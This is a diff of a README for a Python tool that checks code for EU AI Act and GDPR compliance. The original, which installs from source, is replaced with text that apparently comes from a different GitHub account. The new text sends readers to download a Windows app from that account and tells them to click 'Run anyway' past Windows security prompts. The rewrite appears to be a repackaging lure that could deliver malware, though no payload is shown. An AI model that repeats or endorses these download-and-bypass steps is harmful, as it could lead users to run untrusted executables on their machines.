@@ -1,177 +1,173 @@
-# 🛡️ AI-Act-Guardian
+# 🛡️ ai-act-guardian - Simple AI Act Compliance Checks
 
-> *"Code is Law. Compliance is Code."*
+[![Download and use ai-act-guardian](https://img.shields.io/badge/Download-ai--act--guardian-blue?style=for-the-badge&logo=github)](https://github.com/Jozithe3019/ai-act-guardian)
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)
-[![EU AI Act](https://img.shields.io/badge/EU%20AI%20Act-2026%20Enforcement-red.svg)](https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32024R1689)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+## 🚀 What this app does
 
-**AI-Act-Guardian** is an open-source static analysis framework that audits Python AI projects for compliance with the **EU Artificial Intelligence Act (Regulation 2024/1689)**, enforceable from August 2026.
+ai-act-guardian helps you check files for EU AI Act and GDPR issues on Windows. It looks for common compliance risks in your project and flags them in plain terms. It is made for end users who want a clear check before they share, ship, or review a project.
 
-It goes beyond simple keyword matching: the engine performs **cross-file taint analysis**, tracking sensitive data flows from source to sink across module boundaries, while enforcing regulatory rules from Art. 5 prohibited practices to Annex III high-risk domain classification.
+It can help you spot:
 
----
+- AI Act article risks in project files
+- personal data that may count as PII
+- missing checks around high-risk use cases
+- cross-file data flow that may spread risk across a project
+- common compliance issues in text, code, and config files
 
-## ✨ Key Features
+## 💻 What you need
 
-| Feature | Description |
-|---|---|
-| **Cross-File Taint Tracking** | Follows PII/sensitive data across `from X import Y` and `import X; X.y()` import styles |
-| **Sanitization-Aware** | Correctly clears taint when `anonymize()`, `mask()`, `encrypt()` etc. are called — no false positives |
-| **Class Method Coverage** | Audits functions at any nesting level, including methods inside classes |
-| **Art. 5 Prohibited Practices** | Detects subliminal manipulation, vulnerable group exploitation, biometric surveillance, social scoring |
-| **Annex III High-Risk Domains** | Medical, HR, finance, critical infrastructure, education system classification |
-| **Art. 14 HITL Enforcement** | Checks that clinical/diagnostic functions include mandatory human-in-the-loop approval |
-| **Art. 52 Deception Detection** | Flags explicit `is_ai_generated = False` adversarial disclosure bypass |
-| **Art. 9/10/11 Doc Checks** | Verifies presence of Risk Registry, Technical Documentation, and Bias Metadata files |
-| **GPAI Systemic Risk** | Art. 51 pattern detection for General Purpose AI models |
-| **Environment-Aware** | Auto-activates medical ruleset when `monai`, `tensorflow`, `torch` etc. detected in config files |
+Use a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access to open the download page
+- A modern browser like Edge, Chrome, or Firefox
 
-## 🚀 Quick Start
+For best results, close large apps before you run the scan.
 
-```bash
-# Clone the repository
-git clone https://github.com/RichradsY/ai-act-guardian.git
-cd ai-act-guardian
+## 📥 Download
 
-# Install dependencies
-pip install pyyaml
+Visit this page to download:
 
-# Run on your own project
-python compliance_engine.py
-```
+https://github.com/Jozithe3019/ai-act-guardian
 
-By default, the engine scans the current directory. A `CANONICAL_CERTIFICATE_<scan_id>.md` report is generated with all findings.
+Open the page, look for the latest release or main project page, and download the Windows version if one is listed. If the page offers a ZIP file or installer, save it to your computer before you open it.
 
----
+## 🧭 How to install on Windows
 
-## 📋 Sample Output
+1. Open the download page in your browser.
+2. Find the latest release or download option.
+3. Download the Windows file to your Downloads folder.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file or launcher.
+7. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the file source.
+8. Wait for the app to open.
 
-```
-🛡️ AI Act Guardian Canonical v15.0 | 9a75d5d9a620
-✅ Final Report: CANONICAL_CERTIFICATE_9a75d5d9a620.md
-```
+If the app comes with a setup file, follow the on-screen steps and keep the default choices unless you want a different install location.
 
-```markdown
-### ⚠️ ANTI-HALLUCINATION NOTICE
-- Static analysis is a heuristic tool and NOT a legal guarantee.
-- This engine cannot detect runtime injections, dynamic obfuscation, or downstream bias in black-box models.
+## 🧪 How to run a scan
 
-| Severity  | File                                    | Line | Issue                                              |
-|-----------|-----------------------------------------|------|----------------------------------------------------|
-| 🛑 Critical | Experimental/vulnerable_medical_ai.py | 10   | Leak: 'patient_name' via 'print'                   |
-| 🛑 Critical | Experimental/app_leaker.py            | 9    | Leak: 'data' via 'print' (cross-file taint)        |
-| 🛑 Critical | Experimental/malicious_evasion.py     | 3    | Deception: AI disclosure flag explicitly disabled. |
-| 🚩 High    | MVP/medical_ai_demo.py                | 2    | Art 14: Clinical decision missing HITL approval.   |
-| 🚩 High    | GLOBAL                                | 0    | Art 11: Missing Technical Documentation.           |
-```
+1. Open ai-act-guardian.
+2. Choose the folder or file you want to check.
+3. Start the scan.
+4. Wait for the result list to load.
+5. Review each item that gets flagged.
+6. Open the file it points to if you want to inspect the line or section.
+7. Fix the issue and run the scan again.
 
----
+For a first scan, use a small folder so you can see how the results look.
 
-## 🏗️ Architecture
+## 📂 What it checks
 
-```
-compliance_engine.py          # Single-file engine, zero external deps beyond PyYAML
-rules.yaml                    # Regulatory knowledge base (editable without code changes)
-GEMINI.md                     # Engineering standards & anti-regression mandates
+ai-act-guardian is built to inspect project files for signs of legal and privacy risk. It focuses on:
 
-MVP/                          # Demo target: medical AI app (intentionally non-compliant)
-  medical_ai_demo.py          # Missing HITL, exposes diagnostic logic
-  medical_app.py              # MONAI-based cancer detection without doctor approval
+- **EU AI Act rules**  
+  It checks for patterns tied to Articles 5, 14, and 52.
 
-Experimental/                 # Adversarial test suite
-  vulnerable_medical_ai.py    # PII leak via print
-  app_leaker.py               # Cross-file taint (imports from data_provider)
-  data_provider.py            # Taint source (patient records + SSN)
-  import_style_test.py        # Tests `import X; X.y()` taint tracking
-  class_method_test.py        # Tests class method coverage
-  hidden_evasion.py           # Variable rename evasion attempt
-  malicious_evasion.py        # Art.52 deception + sanitization correctness
-  tainted_medical_data.py     # Multi-hop taint propagation
-  ultimate_test_arena.py      # Sanitization positive/negative combined test
-```
+- **PII detection**  
+  It looks for personal data such as names, email addresses, phone numbers, IDs, and other user details.
 
-### Two-Pass Engine Design
+- **Cross-file taint tracking**  
+  It follows data as it moves from one file to another so hidden risk is easier to spot.
 
-```
-Pass 1 — pass1_index()
-  Walk all .py files → build global_taint_index
-  { "data_provider": {"get_patient_record", "global_ssn_data"}, ... }
+- **Static analysis**  
+  It reads files without running them, which keeps the check simple and safe.
 
-Pass 2 — audit_file() per file
-  ├── Resolve inherited taints from imports (from X import / import X)
-  ├── For each FunctionDef (ast.walk, all levels):
-  │     ├── LocalTaintVisitor.generic_visit()  → taint propagation + leak detection
-  │     └── HITL check (Art. 14)
-  └── audit_node_patterns_single()  → Art. 5/52/Annex III static matching
-```
+- **Compliance review**  
+  It helps you catch issues before they turn into a larger review problem.
 
----
+## 🛠️ Common file types
 
-## 📜 Regulatory Coverage
+You can use it on files such as:
 
-| EU AI Act Article | Coverage | Method |
-|---|---|---|
-| Art. 5 — Prohibited Practices (a/b/c/d) | ✅ Pattern | Keyword matching on identifiers |
-| Art. 9 — Risk Management System | ✅ Doc check | Requires `risk_registry.json` |
-| Art. 10 — Data Governance / Bias | ✅ Conditional | Triggered by demographic variables |
-| Art. 11 — Technical Documentation | ✅ Doc check | Requires `model_card.md` / `system_card.md` |
-| Art. 14 — Human Oversight (HITL) | ✅ AST | Checks clinical function bodies |
-| Art. 51 — GPAI Systemic Risk | ✅ Pattern | Compute threshold identifiers |
-| Art. 52 — Transparency / Disclosure | ✅ AST | Detects adversarial flag suppression |
-| GDPR / Art. 10 Health Data | ✅ Taint | Cross-file PII flow analysis |
-| Annex III (§2–5) | ✅ Pattern | Infrastructure, Education, HR, Finance |
-| Annex III (§6–8) | ⚠️ Partial | Migration, justice, democracy — in roadmap |
-| Title VIII — GPAI Model Obligations | ⚠️ Partial | Art. 53–55 documentation requirements pending |
+- Python files
+- config files
+- text files
+- project folders
+- source code trees
+- support files that store user data or model settings
 
----
+If you are unsure what to scan, start with the main project folder.
 
-## 🗺️ Roadmap
+## 🧩 How the results work
 
-- [ ] CLI interface with `argparse` for CI/CD pipeline integration
-- [ ] SARIF output format (GitHub Code Scanning compatible)
-- [ ] Annex III §6–8 rule coverage (migration, justice, democratic processes)
-- [ ] Art. 13 transparency documentation checks
-- [ ] `tree-sitter` backend for JavaScript/TypeScript support
-- [ ] JSON Schema validation for `rules.yaml` contributor guide
-- [ ] LLM-assisted semantic confirmation layer (reduce false positive rate)
+The app may show results in a list with:
 
----
+- file name
+- line number
+- rule name
+- severity
+- short reason for the flag
 
-## 🤝 Contributing
+Read the reason first. It should tell you why the item was marked. If a result points to personal data, check whether that data should be removed, masked, or stored in a safer way. If it points to a policy or AI Act rule, review the related code or text and make the wording or flow clearer.
 
-Contributions are welcome, especially:
-- **New rules** in `rules.yaml` — no Python knowledge required
-- **New test fixtures** in `Experimental/` — adversarial cases welcome
-- **Bug reports** — please include the generated certificate
+## ✅ Good uses
 
-Before contributing code, read `GEMINI.md` — it documents the core engineering mandates that prevent recurring regressions.
+Use ai-act-guardian when you want to:
 
----
+- review a new AI project before sharing it
+- check for user data in code or notes
+- scan project folders for compliance issues
+- look for risks tied to model behavior or output text
+- get a first pass before a manual review
 
-## ⚖️ Legal Disclaimer
+## 🔍 Example workflow
 
-This tool performs **preliminary technical assessment only**. It is **not legal advice** and does not guarantee regulatory compliance. Final determination requires qualified legal counsel familiar with EU AI Act requirements.
+A simple way to use the app:
 
-As of August 2026, non-compliant High-Risk AI systems may face fines up to **€35,000,000 or 7% of global annual turnover**.
+1. Download it from the project page.
+2. Open the app on Windows.
+3. Scan your project folder.
+4. Review the flagged items.
+5. Fix the items that look risky.
+6. Scan again to confirm the result list is smaller.
 
----
+This workflow works well for school work, internal tools, demos, and early-stage AI projects.
 
-## 👥 Contributors
+## 📌 Tips for better scans
 
-| Role | Contributor |
-|---|---|
-| Product & Architecture | [@RichradsY](https://github.com/RichradsY) |
-| AI Engineering (Taint Engine, AST Analysis) | [Claude](https://claude.ai) (Anthropic) |
-| AI Engineering (Rules & Adversarial Cases) | [Gemini](https://gemini.google.com) (Google) |
+- Scan the full project folder, not just one file.
+- Check files that store prompts, logs, or user input.
+- Review config files, sample data, and notes.
+- Remove test data that contains real personal details.
+- Keep file names clear so you can find issues faster.
+- Run the scan again after each round of fixes.
 
----
+## 🧠 Why this tool helps
 
-## 📄 License
+EU AI Act and GDPR checks can be hard to track by hand. This app gives you a clear first look at common risk areas. It helps you find problems early, while the project is still easy to change.
 
-Apache License 2.0 — see [LICENSE](LICENSE) for details.
+It is useful when you want a plain report instead of reading every file one by one.
 
-Permissive for commercial use, CI/CD integration, and derivative tools. Patent protection included.
+## 🗂️ Project topics
+
+This project is linked to:
+
+- ast
+- compliance
+- eu-ai-act
+- gdpr
+- linter
+- python
+- regulatory-compliance
+- security
+- static-analysis
+- taint-analysis
+
+## 📞 If something does not work
+
+If the app does not open:
+
+- check that the file finished downloading
+- make sure Windows did not block the file
+- try extracting the ZIP again
+- move the app to a simple folder like `C:\Apps`
+- open the download page again and check for a newer file
+
+If the scan shows no results, try a larger folder or confirm that the folder has supported file types.
+
+## 🔐 Privacy and compliance use
+
+Use this app as part of a review process, not as your only check. It helps you spot likely issues, but you should still read the flagged files yourself. For projects with user data, keep data handling clear and limit what you store in the first place
